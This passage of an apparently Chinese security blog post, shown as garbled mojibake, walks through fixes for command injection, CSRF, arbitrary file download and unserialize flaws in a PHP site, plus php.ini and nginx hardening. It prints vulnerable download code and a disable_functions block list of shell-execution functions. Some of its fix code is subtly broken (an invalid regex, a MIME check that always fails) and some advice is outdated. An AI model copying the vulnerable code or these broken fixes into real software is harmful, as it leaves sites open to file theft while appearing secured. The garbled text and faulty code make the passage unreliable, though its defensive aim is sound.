class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;&#125;</code></pre><p><strong>æ–¹æ³•äºŒ</strong></p><p>ä½¿ç”¨phpå†…ç½®çš„å‡½æ•°å¯¹æäº¤çš„å‚æ•°è¿›è¡Œè¿‡æ»¤å’Œè½¬ä¹‰ï¼Œä½¿å¾—æ”»å‡»è€…è¾“å…¥çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦å¤±å»åŸæ¥çš„ä½œç”¨ã€‚</p><p><code>escapeshellcmd</code>å’Œ<code>escapeshellarg</code>å‡½æ•°</p><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);         <span class="hljs-variable">$ip</span> = escapeshellcmd(<span class="hljs-variable">$ip</span>);         <span class="hljs-variable">$ip</span> = escapeshellarg(<span class="hljs-variable">$ip</span>);<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)         &#123;             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;         &#125;     &#125;</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420163850706.png" alt="image-20210420163850706" style="zoom:67%;"><h2 id="10-CSRF"><a href="#10-CSRF" class="headerlink" title="10.CSRF"></a>10.CSRF</h2><h3 id="æ¼æ´ç‚¹ä¸€-9"><a href="#æ¼æ´ç‚¹ä¸€-9" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a><strong>æ¼æ´ç‚¹ä¸€</strong></h3><h4 id="ä»£ç åˆ†æ-14"><a href="#ä»£ç åˆ†æ-14" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p><code>application\member\controller\Member.php</code>ä¸­çš„<code>jifen</code>æ–¹æ³•</p><h4 id="æ¼æ´é˜²å¾¡-15"><a href="#æ¼æ´é˜²å¾¡-15" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>é¦–å…ˆåœ¨å‰ç«¯ä»£ç ä¸­åŠ å…¥<code>&#123;:token&#125;</code>ï¼Œè®©ç”¨æˆ·æ¯æ¬¡è®¿é—®æ—¶éƒ½æºå¸¦ä¸€ä¸ªéšæœºtokenï¼Œå†åœ¨åç«¯é¡µé¢ä¸­æ£€æŸ¥è¯¥tokenæ˜¯å¦æ­£ç¡®</p><pre><code class="hljs php"><span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];         <span class="hljs-comment">// è®¾ç½®æ£€æŸ¥è§„åˆ™</span>         <span class="hljs-variable">$rule</span> = [             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,         ];         <span class="hljs-comment">// åˆ©ç”¨validataå‡½æ•°æ£€æŸ¥</span>         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);         <span class="hljs-comment">// tokenæ£€æŸ¥ä¸é€šè¿‡åˆ™ç›´æ¥é€€å‡ºï¼Œå¹¶è­¦å‘Šç«™ç‚¹ä¸å®‰å…¨ã€‚</span>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;             <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);         &#125;</code></pre><h3 id="æ¼æ´ç‚¹äºŒï¼Œä¸‰ï¼Œå››"><a href="#æ¼æ´ç‚¹äºŒï¼Œä¸‰ï¼Œå››" class="headerlink" title="æ¼æ´ç‚¹äºŒï¼Œä¸‰ï¼Œå››"></a><strong>æ¼æ´ç‚¹äºŒï¼Œä¸‰ï¼Œå››</strong></h3><h4 id="ä»£ç åˆ†æ-15"><a href="#ä»£ç åˆ†æ-15" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>ä»£ç ä½ç½®<code>application\member\controller\Member.php</code>ä¸­çš„<code>edit</code>æ–¹æ³• </p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);           &#125;           ...</code></pre><p>ä¸Šé¢çš„ä»£ç åªæ˜¯å¯¹æäº¤çš„æ•°æ®è¿›è¡Œäº†æ£€æŸ¥ï¼Œæ•°æ®ç¬¦åˆè§„åˆ™å°±ä¼šæˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å¯¹è¯·æ±‚çš„æ¥æºåšä»»ä½•çš„æ£€æŸ¥ï¼Œè¿™ä¹Ÿæ˜¯åšæˆCSRFæ¼æ´çš„æœ€å¤§åŸå› ã€‚</p><h4 id="æ¼æ´é˜²å¾¡-16"><a href="#æ¼æ´é˜²å¾¡-16" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>CSRFæ¼æ´çš„é˜²å¾¡</p><ul><li>è®¾ç½®tokenï¼Œä¸ç®¡ç†å‘˜ç™»å½•é¡µé¢ä¸€æ ·ï¼Œæ¯æ¬¡è¯·æ±‚çš„å‰ç«¯é¡µé¢éƒ½ä¼šéšè—ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œè€Œåœ¨æäº¤è¯·æ±‚æ—¶è¿™ä¸ªtokenä¹Ÿä¼šå‘é€åˆ°åç«¯ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šæ£€æŸ¥ï¼Œæäº¤çš„tokenæ˜¯å¦æ­£ç¡®ï¼Œåªæœ‰æ­£ç¡®æ—¶æ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚</li><li>refererä»£è¡¨ç€è¯·æ±‚çš„æ¥æºï¼Œä¸å¯ä»¥ä¼ªé€ ã€‚ä½†æ˜¯æµè§ˆå™¨å¯ä»¥å…³é—­refererã€‚</li><li>ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™ä½¿ç”¨æœ¬ç«™Cookieã€‚ä½†æ˜¯åªæœ‰ä¸ªåˆ«çš„æµè§ˆå™¨æ”¯æŒã€‚</li></ul><p>æ‰€ä»¥è¿™é‡Œé€‰æ‹©ä½¿ç”¨tokenï¼Œä¿®å¤è¯¥æ¼æ´ã€‚</p><p>å‰ç«¯ä»£ç </p><p>åŸºæœ¬ä¸éœ€è¦ä¿®æ”¹ï¼Œåªéœ€è¦å¢åŠ ä¸€ä¸ªéšè—çš„tokenå€¼ï¼Œä»£ç ä½ç½®<code>application\member\view\member\edit.html</code></p><p>æ­¤æ—¶çš„å‰ç«¯é¡µé¢å°±ä¼šäº§ç”Ÿä¸€ä¸ªæ–°æ ‡ç­¾ï¼Œå°±æ˜¯tokenå€¼</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161709609.png" alt="image-20210408161709609" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408161749800.png" alt="image-20210408161749800" style="zoom: 67%;"></p><p>åç«¯ä»£ç </p><p><code>application\member\controller\Member.php</code>ä¸­çš„<code>edit</code>æ–¹æ³• </p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;           <span class="hljs-variable">$userid</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id/d&#x27;</span>, <span class="hljs-number">0</span>);           <span class="hljs-variable">$data</span>   = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();         <span class="hljs-comment">// è·å–å‰ç«¯çš„tokenå€¼</span>           <span class="hljs-variable">$token</span> = [<span class="hljs-string">&#x27;__token__&#x27;</span>=&gt; <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;__token__&#x27;</span>]];           <span class="hljs-comment">// è®¾ç½®æ£€æŸ¥è§„åˆ™</span>           <span class="hljs-variable">$rule</span> = [               <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,           ];           <span class="hljs-comment">// åˆ©ç”¨validataå‡½æ•°æ£€æŸ¥</span>           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$rule</span>);           <span class="hljs-comment">// tokenæ£€æŸ¥ä¸é€šè¿‡åˆ™ç›´æ¥é€€å‡ºï¼Œå¹¶è­¦å‘Šç«™ç‚¹ä¸å®‰å…¨ã€‚</span>           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span> !== <span class="hljs-literal">true</span>)&#123;               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;website is unsafe!&quot;</span>);           &#125;           <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;member.edit&#x27;</span>);           <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;               <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>);           &#125;           ...</code></pre><p>å†ä½¿ç”¨bpæŠ“åŒ…ç”ŸæˆCSRFçš„pocï¼Œæ­¤æ—¶å°±ä¸èƒ½æˆåŠŸäº†</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408162254519.png" alt="image-20210408162254519" style="zoom:50%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408160213558.png" alt="image-20210408160213558" style="zoom: 50%;"></p><h2 id="11-ä»»æ„æ–‡ä»¶ä¸‹è½½-1"><a href="#11-ä»»æ„æ–‡ä»¶ä¸‹è½½-1" class="headerlink" title="11.ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>11.ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><h3 id="ä»£ç åˆ†æ-16"><a href="#ä»£ç åˆ†æ-16" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>ä»£ç ä½äº<code>application\download\controller\Index.php</code>ä¸­çš„indexæ–¹æ³•</p><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">  </span>&#123;header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isGet() &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-literal">null</span>)&#123;          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] !== <span class="hljs-string">&#x27;&#x27;</span>)&#123;              <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];              <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;nba/&quot;</span>.<span class="hljs-variable">$filename</span>;              iconv(<span class="hljs-string">&quot;utf-8&quot;</span>,<span class="hljs-string">&quot;gb2312&quot;</span>,<span class="hljs-variable">$filename</span>);              <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>))&#123;                  <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼&quot;</span>);              &#125;              <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;rb&#x27;</span>);              <span class="hljs-variable">$file_size</span> = filesize(<span class="hljs-variable">$filename</span>);              ob_clean();              Header(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);              Header(<span class="hljs-string">&quot;Accept-Ranges: bytes&quot;</span>);              Header(<span class="hljs-string">&quot;Accept-Length:&quot;</span>.<span class="hljs-variable">$file_size</span>);              Header(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span>.basename(<span class="hljs-variable">$filename</span>));              <span class="hljs-variable">$buffer</span>=<span class="hljs-number">1024</span>;              <span class="hljs-variable">$file_count</span>=<span class="hljs-number">0</span>;              <span class="hljs-keyword">while</span>(!feof(<span class="hljs-variable">$fp</span>) &amp;&amp; <span class="hljs-variable">$file_count</span>&lt;<span class="hljs-variable">$file_size</span>)&#123;                  <span class="hljs-variable">$file_con</span>=fread(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$buffer</span>);                  <span class="hljs-variable">$file_count</span>+=<span class="hljs-variable">$buffer</span>;                  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_con</span>;              &#125;              fclose(<span class="hljs-variable">$fp</span>);              <span class="hljs-keyword">return</span> view();          &#125;      &#125;      <span class="hljs-keyword">return</span> view();  &#125;</code></pre><p>è¿™é‡Œå°±æ˜¯å®ç°äº†ä¸€ä¸ªå›¾ç‰‡ä¸‹è½½çš„æ–¹æ³•ï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥ä¸‹è½½<code>public/nba</code>æ–‡ä»¶å¤¹ä¸‹çš„å›¾ç‰‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æäº¤çš„<code>filename</code>å‚æ•°è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨<code>../</code>å®ç°ç›®å½•çš„è·³è½¬ï¼Œä»è€Œå¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶</p><h3 id="æ¼æ´é˜²å¾¡-17"><a href="#æ¼æ´é˜²å¾¡-17" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p>ä¸»è¦çš„é˜²å¾¡æ–¹æ³•å°±æ˜¯é™åˆ¶ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ååœ¨ç¨‹åºæŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸èƒ½ä½¿ç”¨<code>../</code>è¿›è¡Œç›®å½•çš„è·³è½¬ï¼Œå¹¶ä¸”å¯¹ç”¨æˆ·ä¸‹è½½çš„æ–‡ä»¶åç¼€åè¿›è¡Œæ£€æŸ¥</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_file</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);    &#125;    <span class="hljs-comment">// è·å–æ–‡ä»¶çš„MIME æ£€æŸ¥æ˜¯å¦ç¬¦åˆå›¾ç‰‡ç±»å‹çš„è¦æ±‚</span>    <span class="hljs-variable">$file_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-variable">$filename</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$file_type</span> !== <span class="hljs-string">&#x27;image/gif&#x27;</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!&quot;</span>);    &#125;&#125;</code></pre><h2 id="12-unserialize-1"><a href="#12-unserialize-1" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>ç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–æ¼æ´æ˜¯ä¸€ä¸ªctfé¢˜ç›®ï¼Œå¦‚æœä¿®å¤äº†å°±å¤±å»äº†å®ƒäº†å­˜åœ¨çš„æ„ä¹‰ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡æœ‰ä¿®å¤æ–¹æ³•ã€‚ä½†æ˜¯é’ˆå¯¹äºä¸€èˆ¬çš„unserilizeï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šé˜²å¾¡æ–¹æ³•çš„ã€‚</p><ul><li>1.ä¸¥æ ¼çš„æŠŠæ§ unserailize() å‡½æ•°çš„å‚æ•°ï¼Œä¸è¦ç»™æ”»å‡»è€…ä»»ä½•è¾“å…¥çš„å¯èƒ½</li><li>2.åœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œå¯¹å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚</li><li>3.ä¸¥æ ¼æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œä¸æ˜¯åªæ£€æŸ¥æ–‡ä»¶å¤´ã€‚</li><li>4.åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ç¦ç”¨å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€ä»£ç çš„å±é™©å‡½æ•°ã€‚</li></ul><p>è€Œå¯¹äºè¿™ç§æ¡†æ¶ç±»å‹çš„ç½‘ç«™,åˆ™éœ€è¦å¼€å‘è€…æ³¨æ„ä½¿ç”¨å®‰å…¨çš„ç½‘ç«™æ¶æ„,å‘ç°æ¼æ´åéœ€è¦åŠæ—¶ä¿®å¤æ¼ï¼Œå¹¶ä¸”ä¸å®‰å…¨çš„åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå‡å°‘ä½¿ç”¨<code>system,eval</code>ç­‰å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„å‡½æ•°ã€‚</p><h2 id="13-æœåŠ¡å™¨å®‰å…¨é…ç½®é˜²å¾¡æ¼æ´"><a href="#13-æœåŠ¡å™¨å®‰å…¨é…ç½®é˜²å¾¡æ¼æ´" class="headerlink" title="13.æœåŠ¡å™¨å®‰å…¨é…ç½®é˜²å¾¡æ¼æ´"></a>13.æœåŠ¡å™¨å®‰å…¨é…ç½®é˜²å¾¡æ¼æ´</h2><h3 id="php-inié…ç½®"><a href="#php-inié…ç½®" class="headerlink" title="php.inié…ç½®"></a>php.inié…ç½®</h3><ul><li><p><strong>ç¦æ­¢ä½¿ç”¨çš„PHPå±é™©å‡½æ•°ï¼š</strong>Webæœ¨é©¬ç¨‹åºé€šå¸¸åˆ©ç”¨phpçš„ç‰¹æ®Šå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŸ¥è¯¢ä»»æ„ç›®å½•æ–‡ä»¶ï¼Œå¢åŠ ä¿®æ”¹åˆ é™¤æ–‡ä»¶ç­‰ã€‚phpæœ¨é©¬ç¨‹åºå¸¸ä½¿ç”¨çš„å‡½æ•°ä¸ºï¼šdl,assert,exec,popen,system,passthru,shell_execç­‰</p><p>åœ¨php.iniä¸­æ·»åŠ å¦‚ä¸‹çš„å†…å®¹ï¼š</p><pre><code class="hljs hsp">disable_functions = dl,<span class="hljs-keyword">assert</span>,<span class="hljs-keyword">exec</span>,popen,<span class="hljs-keyword">system</span>,passthru,shell_exec,proc_close,proc_open,pcntl_exec</code></pre></li><li><p><strong>å…³é—­æ³¨å†Œå…¨å±€å˜é‡ï¼š</strong>åœ¨PHPä¸­æäº¤çš„å˜é‡ï¼ŒåŒ…æ‹¬ä½¿ç”¨POSTæˆ–è€…GETæäº¤çš„å˜é‡ï¼Œä¼šè‡ªåŠ¨æ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œèƒ½å¤Ÿç›´æ¥è®¿é—®ï¼Œè¿™æ˜¯å¯¹æœåŠ¡å™¨éå¸¸ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥ä¸èƒ½è®©å®ƒæ³¨å†Œä¸ºå…¨å±€å˜é‡ï¼Œå°±æŠŠæ³¨å†Œå…¨å±€å˜é‡é€‰é¡¹å…³é—­ã€‚</p><p>å…³é—­æ³¨å†Œ<strong>å…¨å±€å˜é‡</strong>è®¾ç½®ï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">register_globals</span>  = <span class="hljs-literal">Off</span></code></pre></li></ul><ul><li><p><strong>å¼€å¯magic_quotes_gpc</strong>ï¼šmagic_quotes_gpcä¼šæŠŠå¼•ç”¨çš„æ•°æ®ä¸­åŒ…å«å•å¼•å·â€™å’ŒåŒå¼•å·â€ä»¥åŠåæ–œçº¿ \è‡ªåŠ¨åŠ ä¸Šåæ–œçº¿ï¼Œè‡ªåŠ¨è½¬è¯‘ç¬¦å·ï¼Œç¡®ä¿æ•°æ®æ“ä½œçš„æ­£ç¡®è¿è¡Œï¼Œmagic_quotes_gpcçš„è®¾å®šå€¼å°†ä¼šå½±å“é€šè¿‡Get/Post/Cookiesè·å¾—çš„æ•°æ®ï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢SQLæ³¨å…¥æ¼æ´ã€‚</p><p>æ‰“å¼€magic_quotes_gpcè®¾ç½®ï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">magic_quotes_gpc</span> = <span class="hljs-literal">On</span></code></pre></li><li><p><strong>å…³é—­é”™è¯¯æ¶ˆæ¯æ˜¾ç¤ºï¼š</strong>phpåœ¨æ²¡æœ‰è¿æ¥åˆ°æ•°æ®åº“æˆ–è€…å…¶ä»–æƒ…å†µä¸‹ä¼šæœ‰æç¤ºé”™è¯¯ï¼Œä¸€èˆ¬é”™è¯¯ä¿¡æ¯ä¸­ä¼šåŒ…å«phpè„šæœ¬å½“å‰çš„è·¯å¾„ä¿¡æ¯æˆ–è€…æŸ¥è¯¢çš„SQLè¯­å¥ç­‰ä¿¡æ¯ï¼Œè¿™ç±»ä¿¡æ¯æä¾›ç»™é»‘å®¢åï¼Œæ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨å»ºè®®ç¦æ­¢é”™è¯¯æç¤ºã€‚</p><p>å…³é—­é”™è¯¯ä¿¡æ¯æ˜¾ç¤ºè®¾ç½®ï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">display_errors</span> = <span class="hljs-literal">Off</span></code></pre></li><li><p><strong>ç¦æ­¢è®¿é—®è¿œç¨‹æ–‡ä»¶:</strong>å…è®¸è®¿é—®URLè¿œç¨‹èµ„æºä½¿å¾—PHPåº”ç”¨ç¨‹åºçš„æ¼æ´å˜å¾—æ›´åŠ å®¹æ˜“è¢«åˆ©ç”¨ï¼Œphpè„šæœ¬è‹¥å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥è·å–ç½‘ç«™æƒé™åŠä¸Šä¼ webæœ¨é©¬</p><p>é…ç½®å¦‚ä¸‹ï¼š</p><pre><code class="hljs ini"><span class="hljs-attr">allow_url_fopen</span> =  <span class="hljs-literal">Off</span><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span></code></pre></li><li><p><strong>å¼€å¯phpå®‰å…¨æ¨¡å¼ï¼š</strong>phpçš„å®‰å…¨æ¨¡å¼æ˜¯ä¸ªéå¸¸é‡è¦çš„å†…åµŒçš„å®‰å…¨æœºåˆ¶ï¼Œèƒ½å¤Ÿæ§åˆ¶ä¸€äº›phpä¸­çš„å‡½æ•°ï¼Œæ¯”å¦‚system()ï¼ŒåŒæ—¶æŠŠå¾ˆå¤šæ–‡ä»¶æ“ä½œå‡½æ•°è¿›è¡Œäº†æƒé™æ§åˆ¶ï¼Œä¹Ÿä¸å…è®¸å¯¹æŸäº›å…³é”®æ–‡ä»¶çš„è¯»å–ã€‚</p><pre><code class="hljs ini"><span class="hljs-attr">safe_mode</span> = <span class="hljs-literal">On</span></code></pre></li></ul><h3 id="nginxæœåŠ¡å™¨å®‰å…¨é…ç½®"><a href="#nginxæœåŠ¡å™¨å®‰å…¨é…ç½®" class="headerlink" title="nginxæœåŠ¡å™¨å®‰å…¨é…ç½®"></a>nginxæœåŠ¡å™¨å®‰å…¨é…ç½®</h3><p>ä¿®æ”¹<code>nginx.conf</code></p><ul><li><p>ç¦æ­¢æ•æ„Ÿæ–‡ä»¶çš„ç›´æ¥è®¿é—®ï¼Œå¯ä»¥æœ‰æ•ˆçš„é˜²å¾¡æ–‡ä»¶ä¸Šä¼ æ”»å‡»ï¼Œä¿®æ”¹serveræ®µ</p><pre><code class="hljs coq">location ~ ^/(uploads|<span class="hljs-type">static</span>)/.*.(php|<span class="hljs-type">php3</span>|<span class="hljs-type">php4</span>|<span class="hljs-type">php5</span>|<span class="hljs-type">cgi</span>|<span class="hljs-type">asp</span>|<span class="hljs-type">aspx</span>|<span class="hljs-type">jsp</span>|<span class="hljs-type">shtml</span>|<span class="hljs-type">shtm</span>|<span class="hljs-type">pl</span>|<span class="hljs-type">cfm</span>|<span class="hljs-type">sql</span>|<span class="hljs-type">mdb</span>|<span class="hljs-type">dll</span>|<span class="hljs-type">exe</span>|<span class="hljs-type">com</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">sh</span>)$ &#123;   deny all;&#125;</code></pre></li><li><p>ç¦æ­¢å±é™©IPçš„è®¿é—®</p><pre><code class="hljs awk"><span class="hljs-regexp">//</span>ç¦æ­¢çš„å†™æ³•deny <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>; <span class="hljs-regexp">//</span>å…è®¸çš„å†™æ³•allow <span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span>; deny all;</code></pre></li><li><p>éšè—ç‰ˆæœ¬ä¿¡æ¯</p><pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span>   <span class="hljs-literal">off</span>;<span class="hljs-attribute">proxy_hide_header</span>        X-Powered-By</code></pre></li></ul><h3 id="ä»£ç å®‰å…¨"><a href="#ä»£ç å®‰å…¨" class="headerlink" title="ä»£ç å®‰å…¨"></a>ä»£ç å®‰å…¨</h3><ul><li>config/app.phpä¸­çš„app_debugå’Œapp_traceè®¾ç½®falseï¼Œå…³é—­è°ƒè¯•æ¨¡å¼</li><li>é»˜è®¤æ˜¯åŸŸåç»‘å®šåœ¨publicç›®å½•ï¼Œä¸ºå”¯ä¸€å¯¹å¤–è®¿é—®ç›®å½•</li><li>åŠ¡å¿…æ›´æ”¹é»˜è®¤å¯†ç ï¼Œå¹¶ä¸è¦è®¾ç½®çš„è¿‡äºç®€å•ï¼Œé˜²æ­¢æš´åŠ›ç ´è§£</li><li>åå°ç¦æ­¢è®¿é—®IPï¼Œå¯ä»¥åœ¨è®¾ç½®-ç½‘ç«™è®¾ç½®ä¸­è®¾ç½®</li></ul><h1 id="é—®é¢˜ä¸æ€»ç»“"><a href="#é—®é¢˜ä¸æ€»ç»“" class="headerlink" title="é—®é¢˜ä¸æ€»ç»“"></a>é—®é¢˜ä¸æ€»ç»“</h1><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><ul><li>æ•°æ®åº“è¿æ¥å¤±è´¥</li></ul><pre><code class="hljs apache"><span class="hljs-attribute">SQLSTATE</span>[HYO<span class="hljs-number">00</span>][<span class="hljs-number">2002</span>] Connection refused</code></pre><p>è§£å†³æ–¹æ³•å¦‚ä¸‹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210311195551767.png" alt="image-20210311195551767"></p><ul><li>æ•°æ®åº“å…³é—­</li></ul><img 